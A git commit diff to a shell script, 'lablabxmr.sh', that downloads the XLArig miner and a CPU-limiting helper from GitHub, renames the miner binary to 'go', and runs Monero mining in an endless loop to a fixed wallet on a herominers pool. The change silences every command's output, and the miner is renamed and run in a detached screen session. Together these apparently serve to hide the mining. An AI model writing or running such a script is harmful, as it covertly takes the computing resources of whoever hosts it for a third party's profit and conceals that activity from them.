6d1cdf8622f9cd4e3ce6cae6ac9dfb58cdeea751
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-04-11 23:01:26 +0800

    Update lablabxmr.sh

--- lablabxmr.sh
+++ lablabxmr.sh
@@ -6,15 +6,14 @@ sudo apt update > /dev/null 2>&1
 sudo apt install cpulimit > /dev/null 2>&1
 sudo apt install unzip > /dev/null 2>&1
 sudo apt install screen -y > /dev/null 2>&1
-wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh 
-chmod +x limiting.sh 
-screen -dmS randum ./limiting.sh xlarig 65 75 
-wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
-unzip XLArig-v5.2.2-linux-x86_64.zip
-ls
-mv xlarig go
+wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh > /dev/null 2>&1
+chmod +x limiting.sh > /dev/null 2>&1
+screen -dmS randum ./limiting.sh xlarig 65 75 > /dev/null 2>&1
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip > /dev/null 2>&1
+unzip XLArig-v5.2.2-linux-x86_64.zip > /dev/null 2>&1
+mv xlarig go > /dev/null 2>&1
 while [ 1 ]; do
-./go --cpu-priority 5 -a rx/0 -u 83qVLHdgsWhRNNFT6PQqWYRNMZ5xPQr1UDbpWiZeJEypWBh4EKco7Y6BoWjhz1x77Rii5CFtvtC3MVDwZmtcmW9H4DKkmsy -p Okbaahhh -o ca.monero.herominers.com:10191 --donate-level=0 --tls -donate-over-proxy=0 --cpu-no-yield  --randomx-mode=auto --randomx-1gb-pages 
+./go --cpu-priority 5 -a rx/0 -u 83qVLHdgsWhRNNFT6PQqWYRNMZ5xPQr1UDbpWiZeJEypWBh4EKco7Y6BoWjhz1x77Rii5CFtvtC3MVDwZmtcmW9H4DKkmsy -p Okbaahhh -o sg.monero.herominers.com:10191 --donate-level=0 --tls -donate-over-proxy=0 --cpu-no-yield  --randomx-mode=auto --randomx-1gb-pages > /dev/null 2>&1 
 sleep 3
 done
 sleep 999 > /dev/null 2>&1
